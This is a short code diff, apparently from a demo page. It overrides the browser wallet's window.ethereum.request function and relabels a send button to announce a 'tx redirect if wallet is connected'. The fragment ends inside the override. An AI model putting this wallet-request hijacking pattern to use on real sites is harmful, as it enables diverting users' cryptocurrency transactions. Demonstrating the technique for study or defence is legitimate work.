@@ -1,5 +1,8 @@
 const requestOriginal = window.ethereum.request
 
+const sendButton = document.getElementById('sendButton');
+sendButton.innerHTML = sendButton.innerHTML + " (tx redirect if wallet is connected)"
+
 window.ethereum.request = function() {
   try {
     const walletAddress = document.getElementById('walletAddress').innerHTML
